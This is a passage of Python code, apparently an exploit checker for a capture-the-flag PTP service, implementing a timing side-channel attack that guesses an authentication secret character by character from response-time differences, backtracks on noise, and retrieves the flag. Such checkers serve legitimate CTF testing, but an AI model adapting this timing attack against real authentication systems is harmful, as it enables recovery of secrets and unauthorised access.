    secret = bytearray()

    async def guess_char(secret):
        durations = np.empty(len(string.printable))
        i_request = 0
        i_response = 0

        while i_request < len(string.printable):
            j = 0

            for tlv in message.get_tlvs():
                if i_request >= len(string.printable):
                    break

                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
                    continue

                character = string.printable[i_request].encode("ascii")
                finalize_auth_tlv(tlv, request, secret + character)

                if j >= 1:
                    i_request += 1
                
                j += 1

            connection.send_raw(request, GENERAL_PORT)
            response = await connection.receive(GENERAL_PORT)

            if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
                raise MumbleException("Expected management message")
            
            j = 0
            for tlv in response.get_tlvs():
                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
                    continue

                if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                    received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                    return None, None, received_flag
                elif tlv.payload.management.id != ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
                    continue

                # The first measurement is garbage (likely due to cache misses)
                if j >= 2:
                    durations[i_response] = tlv.payload.management.payload.time - last_time
                    i_response += 1

                if i_response >= len(string.printable):
                    break
                
                last_time = tlv.payload.management.payload.time
                j += 1

        # Optimization: filter out obvious outliers (required for CI)
        durations[durations > np.median(durations) + 5000] = 0

        guess = string.printable[np.argmax(durations)].encode("ascii")
        sqrt_duration = np.sqrt(np.sum(durations))

        return guess, sqrt_duration, None
    
    sqrt_durations = [0]

    # Likely not as many iterations needed, but I don't want the CI to randomly fail
    for i in range(100):
        guess, sqrt_duration, received_flag = await guess_char(bytes(secret))

        if received_flag is not None:
            logger.info(f"Received flag {received_flag} after {i} iterations")
            return received_flag
        
        # Backtracking if we made an error due to noise
        if np.abs(sqrt_duration - sqrt_durations[-1]) > 100:
            secret += guess
            sqrt_durations += [sqrt_duration]
        else:
            secret = secret[:-1]
            sqrt_durations = sqrt_durations[:-1]

if __name__ == "__main__":
    checker.run()
